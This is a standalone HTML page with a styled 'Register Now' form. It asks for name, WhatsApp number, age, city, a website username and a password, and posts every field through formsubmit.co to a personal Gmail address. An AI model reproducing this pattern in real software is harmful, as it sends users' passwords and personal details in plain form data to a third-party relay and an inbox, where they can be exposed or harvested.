<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Futuristic Form</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background: #0e0e0e;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }

        .container {
            background: #1a1a1a;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 400px; /* Adjusted max-width for better fit */
            box-sizing: border-box;
            overflow: hidden; /* Prevent overflow */
        }

        .form-title {
            text-align: center;
            margin-bottom: 20px;
            font-size: 24px;
            color: #00c1d6;
        }

        .input-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-size: 14px;
            margin-bottom: 5px;
            color: #aaa;
        }

        input[type="text"],
        input[type="tel"],
        input[type="number"],
        input[type="password"],
        select {
            width: 100%;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background: #1e1e1e;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box;
        }

        input[type="text"]:focus,
        input[type="tel"]:focus,
        input[type="number"]:focus,
        input[type="password"]:focus,
        select:focus {
            border-color: #00c1d6;
            outline: none;
        }

        .submit-button {
            width: 100%;
            padding: 12px; /* Increased padding for better click area */
            border: none;
            border-radius: 5px;
            background: #00c1d6;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            text-align: center;
            transition: background 0.3s ease;
        }

        .submit-button:hover {
            background: #0092a6;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="form-title">Register Now</h1>
        <form action="https://formsubmit.co/atomcyberforce@gmail.com" method="POST">
            <div class="input-group">
                <label for="name">Name</label>
                <input type="text" id="name" name="name" required>
            </div>
            <div class="input-group">
                <label for="whatsapp">Whatsapp Number</label>
                <input type="tel" id="whatsapp" name="whatsapp" required>
            </div>
            <div class="input-group">
                <label for="age">Age</label>
                <input type="number" id="age" name="age" required>
            </div>
            <div class="input-group">
                <label for="city">City</label>
                <input type="text" id="city" name="city" required>
            </div>
            <div class="input-group">
                <label for="username">Your Username For Website</label>
                <input type="text" id="username" name="username" required>
            </div>
            <div class="input-group">
                <label for="password">Your Password For Website</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="input-group">
                <label for="post-link">Does You Post Link In The Chat?</label>
                <select id="post-link" name="post_link" required>
                    <option value="yes">Yes</option>
                    <option value="no">No</option>
                </select>
            </div>
            <button type="submit" class="submit-button">Submit</button>
        </form>
    </div>
</body>
</html>
